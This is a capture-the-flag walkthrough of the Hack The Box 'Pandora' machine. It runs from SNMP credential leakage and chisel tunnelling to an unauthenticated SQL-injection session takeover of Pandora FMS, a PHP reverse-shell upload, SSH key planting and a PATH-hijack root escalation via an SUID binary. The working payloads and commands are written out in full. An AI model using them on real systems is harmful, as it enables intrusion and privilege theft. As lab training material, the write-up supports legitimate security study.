

Link to Box => https://app.hackthebox.com/machines/Pandora/

# Enumeration

## nmap initial scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Server Enum
```text
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://pandora.htb/FUZZ -o ffuf/ffufRaft -of html -ic -r -recursion -recursion-depth 4 -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf

assets                  [Status: 200, Size: 1690, Words: 112, Lines: 21]
index.html              [Status: 200, Size: 33560, Words: 13127, Lines: 908]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10]
                        [Status: 200, Size: 33560, Words: 13127, Lines: 908]
```

Tried some other wordlists as well. Nothing useful came up.

### ffuf subdomain test
```bash
ffuf -u http://pandora.htb -H "Host: FUZZ.pandora.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -c -o ffuf/subdomain -of html -fs 33560

EMPTY
```

### nikto -h
```bash
nikto -h http://panda.htb/
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 8318, size: 5d23e548bc656, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ /: A Wordpress installation was found.
```

## observations
- Web Dir listing seems to be enabled. Check http://pandora.htb/assets/
- Prescence of http://pandora.htb/assets/images/blog/ suggests there is a blog somewhere. We have to find it. Perhaps a login is available?
- nikto output also has a weird line. Not really sure what that means though

### nmap UDP scan
Scanning UDP as a last resort, since the website is a dead end.

```bash
sudo nmap -sUV panda.htb -oN nmap/udpFirst -vv

PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora
```

So we have found an SNMP port. This is possibly a foothold vector. Let's try getting some info.

Using this as a guide => https://medium.com/@minimalist.ascent/enumerating-snmp-servers-with-nmap-89aaf33bce28

```bash
└─$ sudo nmap -sUV -p 161 --script=snmp-info pandora.htb
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 02:42 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.047s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 25m05s
Service Info: Host: pandora

└─$ sudo nmap -sUV -p 161 --script=snmp-interfaces pandora.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 02:43 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.046s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 142.54 Kb sent, 142.54 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:3f:d3 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 146.13 Kb sent, 165.78 Kb received
Service Info: Host: pandora


└─$ sudo nmap -sUV -p 161 --script=snmp-netstat pandora.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 02:44 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.045s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:54460   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
Service Info: Host: pandora


└─$ sudo nmap -sUV -p 161 --script=snmp-sysdescr pandora.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 02:46 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.046s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 29m2.87s (174287 timeticks)


Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-14 02:47 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.045s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-processes:
|   849: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p CENSORED'
|   863: 
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
|   1103: 
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p CENSORED
```

We may have inadvertently found some credentials. Trying the combo `daniel:CENSORED` on the SSH port

SUCCESS!! This was way easier than expected

# Foothold
User flag is not present in the home directory. Trying to search for it.
```bash
daniel@pandora:~$ find / -type f -name user.txt 2>/dev/null 
/home/matt/user.txt

daniel@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7 15:00 .
drwxr-xr-x 4 root root 4096 Dec  7 14:32 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Jan 14 07:17 user.txt
```

We will have to find a way to pivot to the `matt` user if we are to get the user flag. 

# Privesc

While looking for SUID binaries, found this
```bash
daniel@pandora:/home/matt$ ls -lh /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup
```

Cant really do much with it tho. As we are not the `matt` user.

Anyway running `linpeas.sh` now. We are running under `daniel`, so we dont have a lot of privileges.

## linpeas run

Interesting Stuff only.

```bash
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

╔══════════╣ Protections
═╣ Is ASLR enabled? ............... Yes                                                                                                                      
═╣ Is this a virtual machine? ..... Yes (vmware)            

══════════╣ Cleaned processes                                                                                                                               
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
systemd+     528  0.0  0.1  18408  7456 ?        Ss   16:13   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root         779  0.0  0.0   6812  2772 ?        Ss   16:13   0:00 /usr/sbin/cron -f
root         797  0.0  0.0   8352  3396 ?        S    16:13   0:00  _ /usr/sbin/CRON -f
root         810  0.0  0.0   2608   548 ?        Ss   16:13   0:00      _ /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p CENSORED'
root        1119  0.0  0.0   2488  1428 ?        S    16:13   0:00          _ /usr/bin/host_check -u daniel -p CENSORED

# What in the world? cap_setuid ??
root         838  0.0  0.7 228068 31468 ?        Ss   16:13   0:01 /usr/sbin/apache2 -k start
www-data    1050  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1051  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1052  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1053  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1054  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    1123  0.0  0.3 228500 13756 ?        S    16:13   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                            
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                              

╔══════════╣ Users with console
daniel:x:1001:1001::/home/daniel:/bin/bash                                                                                                                   
matt:x:1000:1000:matt:/home/matt:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                              
/usr/bin/curl
/usr/bin/nc
/usr/bin/netcat
/usr/bin/nmap
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ MySQL
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                    

═╣ MySQL connection using default root/root ........... No                                                                                                   
═╣ MySQL connection using root/toor ................... No                                                                                                   
═╣ MySQL connection using root/NOPASS ................. No 

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec  3 12:57 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Dec  3 12:57 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3 12:56 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 31 Dec  3 12:53 /etc/apache2/sites-enabled/pandora.conf -> ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
-rw-r--r-- 1 root root 72958 Jun 11  2021 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Oct  6  2020 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                       
tmux 3.0a                                                                                                                                                    

/tmp/tmux-1001
╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 root root 14844 Mar  4  2020 /usr/share/php/DB/storage.php                                                                                      

-rw-r--r-- 1 matt matt 2222 Jan  3  2020 /var/www/pandora/pandora_console/include/help/en/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>
-rw-r--r-- 1 matt matt 2666 Jan  3  2020 /var/www/pandora/pandora_console/include/help/es/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>
-rw-r--r-- 1 matt matt 3159 Jan  3  2020 /var/www/pandora/pandora_console/include/help/ja/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                      
-rw-r--r-- 1 matt matt 1263 Jan  3  2020 /var/www/pandora/pandora_console/Dockerfile

╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                                                                          

═══════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                      
                                         ╚═══════════════════╝                                                                                               
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)

╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 44071 Nov 21 00:08 /usr/bin/wsrep_sst_mariabackup

╔══════════╣ Searching *password* or *credential* files in home (limit 70)

/var/www/pandora/pandora_console/godmode/groups/credential_store.php
/var/www/pandora/pandora_console/include/functions_credential_store.php
/var/www/pandora/pandora_console/images/user_password.png

```

Also running LSE. Below are all the things different from the linpeas run
## lse run

```bash
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1001/gnupg/S.gpg-agent
/run/user/1001/gnupg/S.gpg-agent.ssh
/run/user/1001/gnupg/S.gpg-agent.extra
/run/user/1001/gnupg/S.gpg-agent.browser

===================================================================( CVEs )=====                                                                             
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable!
---
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... yes!
---
5.4.0-91-generic
---
```

## Further Steps

Tried messing around in `/var/www/pandora` which is the location of a website which hosted at `pandora.panda.htb`. Just in case added `pandora.pandora.htb` to `/etc/hosts`, which had no effect(more on this later). The web dir has `matt` permissions. So cannot make any changes. 

It looks to be an install of [Pandora FMS](https://pandorafms.com/en/) . So if we can get it to spawn a shell, we can a `matt` user shell.

And then I noticed this. 
```bash
daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Note the `localhost` on the first line. This website is only available locally. 
```bash
daniel@pandora:/etc/apache2/sites-available$ curl -v http://localhost
*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET / HTTP/1.1
> Host: localhost
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 19 May 2022 18:54:29 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Fri, 11 Jun 2021 14:55:39 GMT
< ETag: "3f-5c47eb370f0c0"
< Accept-Ranges: bytes
< Content-Length: 63
< Content-Type: text/html
< 
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```
This is the content of `/var/www/pandora/index.html`.

### Reverse Port Forwarding to access internal website.

Let's use [chisel](https://github.com/jpillora/chisel) to create a relay between the two machines. And access it from our local machine, which will make running exploit vulns on the website easier.

**NOTE:** We can use SSH port forwarding, or use the socat binary present on the machine for this as well(check linpeas useful software list).

```bash
daniel@pandora:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:   Ubuntu 20.04.3 LTS
Release:       20.04
Codename:      focal
daniel@pandora:~$ uname -a
Linux pandora 5.4.0-91-generic \#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

Let's get the linux-amd64 executable from the [chisel github releases](https://github.com/jpillora/chisel/releases/) , which we can use on both our machine and the remote one..

```bash
# On the remote machine
daniel@pandora:/tmp/exp$ ./chisel server --port 9000 --proxy http://localhost:80
2022/05/19 19:30:40 server: Fingerprint XKMkRmW0yrANxp6Q0gDbxfx20bBU+DZQMNeBAzdlACY=
2022/05/19 19:30:40 server: Reverse proxy enabled
2022/05/19 19:30:40 server: Listening on http://0.0.0.0:9000

```

Let's try a simple chisel proxy. It soon becomes clear this does not work. The page is all wonky because a lot of HTML on pandora fms index.html is coded this way
```html
<link rel="stylesheet" href="http://localhost/pandora_console/include/styles/common.css" type="text/css" />
<link rel="stylesheet" href="http://localhost/pandora_console/include/styles/menu.css" type="text/css" />
<link rel="stylesheet" href="http://localhost/pandora_console/include/styles/tables.css" type="text/css" />

<script language="javascript" type="text/javascript" src="http://localhost/pandora_console/include/graphs/flot/jquery.flot.js"></script>
<script language="javascript" type="text/javascript" src="http://localhost/pandora_console/include/graphs/flot/jquery.flot.min.js"></script>
<script language="javascript" type="text/javascript" src="http://localhost/pandora_console/include/graphs/flot/jquery.flot.time.js"></script>
```

We will need to be able to address this website as `http://localhost` on our local machine. 

To accomplish this, we will be using chisel's reverse port forwarding feature. 

TO get this to work. the chisel "server" runs on our machine, aka attacker machine in reverse proxy mode. And the chisel "client" runs on the remote machine.

Used this as a guide => https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683

```text
# on local machine
└─$ ./chisel server -p 3477 --reverse -v
2022/05/19 16:33:34 server: Reverse tunnelling enabled
2022/05/19 16:33:34 server: Fingerprint 98Ub3tYzyTENqnEYjejWa46FQehJHQta2rsD2U0voEI=
2022/05/19 16:33:34 server: Listening on http://0.0.0.0:3477
2022/05/19 16:39:01 server: session#1: Handshaking with 10.10.11.136:54540...
2022/05/19 16:39:01 server: session#1: Verifying configuration
2022/05/19 16:39:01 server: session#1: tun: Created
2022/05/19 16:39:01 server: session#1: tun: proxy#R:80=>80: Listening
2022/05/19 16:39:01 server: session#1: tun: Bound proxies
2022/05/19 16:39:01 server: session#1: tun: SSH connected

# on remote machine
daniel@pandora:/tmp/exp$ ./chisel client 10.10.14.26:3477 R:80:127.0.0.1:80/tcp
2022/05/19 20:38:27 client: Connecting to ws://10.10.14.26:3477
2022/05/19 20:38:27 client: Connected (Latency 44.074267ms)

```

Chisel server on local machine starts in reverse proxy mode, listens in port 3477 for connections. 

Chisel client on remote machine connects to our chisel server, with the following config
- "R" denotes reverse port forward
- Listen on port 80 on our client machine. Since this is a low number port, we can only do this on our machine(not the remote server)
- Forward everything from localhost:80 to "127.0.0.1:80" on the remote machine, thereby granting access to the Pandora FMS website.

Once executed, we can go to http://localhost on our machine. And we can see the Pandora FMS login portal.

### Pandora FMS Investigation

At the bottom of the page we see **v7.0NG.742_FIX_PERL2020**

Now if we could only get the uname/pwd directly from the web app.
```bash
daniel@pandora:/var/www/pandora/pandora_console/include$ ls -lh config.php
-rw------- 1 matt matt 413 Dec  3 14:06 config.php
```

Not accessible.

When we try the creds for `daniel`, we get `ERROR: User only can use the API.`

Anyway, let's try searching for exploits for this version

[CVE-2020-5844](https://www.cve.org/CVERecord?id=CVE-2020-5844) CVE record lists thecybergeek(one of the box creators) as discoverer of the vuln. Also lists the exact same version of Pandora FMS. Exploit script from their github https://github.com/TheCyberGeek/CVE-2020-5844. This is an authenticated RCE bug though.

After looking at the [Pandora FMS Vuln List](https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/) we see three interesting CVEs
- [CVE-2021-32098](https://www.cve.org/CVERecord?id=CVE-2021-32098) as a vulnerability fixed in v743. Allows unauthenticated attackers to perform Phar deserialization.
- [CVE-2021-32099](https://www.cve.org/CVERecord?id=CVE-2021-32099) as a vuln ficed in v743. Also unauthenticated.
- [CVE-2021-32100](https://www.cve.org/CVERecord?id=CVE-2021-32100) "A remote file inclusion vulnerability exists in Artica Pandora FMS 742, exploitable by the lowest privileged user."

A great explanation on these vulns is here, by the folks who discovered it => https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/

CVE-2021-32099 is **A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session**. Sounds exactly like what we need.

### CVE-2021-32099 unauthenticated session upgrade using SQLi
We will use the link available here => https://github.com/ibnuuby/CVE-2021-32099, and remove port 8000 since we dont need it.
```
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

Put this in the browser. Reload once and then go back to http://locahost and you will be logged in(because of the insertion of a session cookie taken straight from the DB).

**Extra Info:** URL-decode of the above URL to see the SQLi being used
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

In the interface, under "Admin Tools" we see a file manager => http://localhost/pandora_console/index.php?sec=gextensions&sec2=godmode/setup/file_manager

Let's use this to upload a PHP webshell. On Kali, this is available at `/usr/share/webshells/php/php-reverse-shell.php`.

Create dir shell. Upload a file in it as `shell.php`. And then access it directly. For me it was http://localhost/pandora_console/images/shell/shell.php

And we GOT IT!
```bash
└─$ ncat -lnvp 443                
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.136.
Ncat: Connection from 10.10.11.136:37958.
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:27:10 up  6:13,  2 users,  load average: 0.01, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.26      16:23   37.00s  0.99s  0.99s -bash
daniel   pts/1    tmux(30407).%0   19:29    1:46m  0.88s  0.76s ./chisel client 10.10.14.26:3477 R:80:127.0.0.1:80/tcp
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
matt@pandora:/$ export TERM=xterm-25color
```

Go get that user flag!

Adding SSH keys, so that we can login using a regular shell and not a clunky reverse shell.
```bash
└─$ ssh-keygen -f ./pandora-key -t ecdsa -b 521
Generating public/private ecdsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./pandora-key
Your public key has been saved in ./pandora-key.pub
...
...
└─$ ll
total 16
-rw------- 1 kali kali  724 May 19 18:42 pandora-key
-rw-r--r-- 1 kali kali  263 May 19 18:42 pandora-key.pub
```
Append the pandora-key.pub to `~/.ssh/authorized_keys` in matt's home folder. And voila! we have ssh login as matt.

```bash
└─$ ssh -i pandora-key matt@pandora.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...
...
matt@pandora:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

You can stop the chisel instances now :)

We can finally get the contents of `/var/www/pandora/pandora_console/include/config.php`.
```php
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";
$config["dbname"]="pandora";
$config["dbuser"]="pandora";
$config["dbpass"]="CENSORED";
$config["dbhost"]="localhost";
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";
error_reporting(0); 
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>
```

```mysql
matt@pandora:~$ mysql -u pandora -p pandora
Enter password:

MariaDB [pandora]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| pandora            |
+--------------------+
MariaDB [pandora]> show tables;
| tpassword_history                  | # Only Interesting table I found

MariaDB [pandora]> select * from tpassword_history;
+---------+---------+----------------------------------+---------------------+---------------------+
| id_pass | id_user | password                         | date_begin          | date_end            |
+---------+---------+----------------------------------+---------------------+---------------------+
|       1 | matt    | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 | 0000-00-00 00:00:00 |
|       2 | daniel  | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 | 0000-00-00 00:00:00 |
+---------+---------+----------------------------------+---------------------+---------------------+
2 rows in set (0.001 sec)
```

Ran it through crackstation. Nothing useful.

Now, let's try to try to do something with that SUID binary `/usr/bin/pandora_backup`. Downloading to local system and decompiling with Ghidra gives us the following
```C
bool main(void)

{
  __uid_t __euid;
  __uid_t __ruid;
  int iVar1;
  
  __euid = getuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  puts("PandoraFMS Backup Utility");
  puts("Now attempting to backup PandoraFMS client");
  iVar1 = system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*");
  if (iVar1 == 0) {
    puts("Backup successful!");
    puts("Terminating program!");
  }
  else {
    puts("Backup failed!\nCheck your permissions!");
  }
  return iVar1 != 0;
}

```

If we could write something in PATH, we can execute a fake `tar` to get us a root shell.

```bash
matt@pandora:~/bin$ which bash
/usr/bin/bash
matt@pandora:~/bin$ echo "/usr/bin/bash -p" > tar
matt@pandora:~/bin$ chmod 777 tar
matt@pandora:~/bin$ export PATH=$PWD:$PATH
matt@pandora:~/bin$ echo $PATH
/home/matt/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~/bin$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~/bin# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```

Go get that root flag!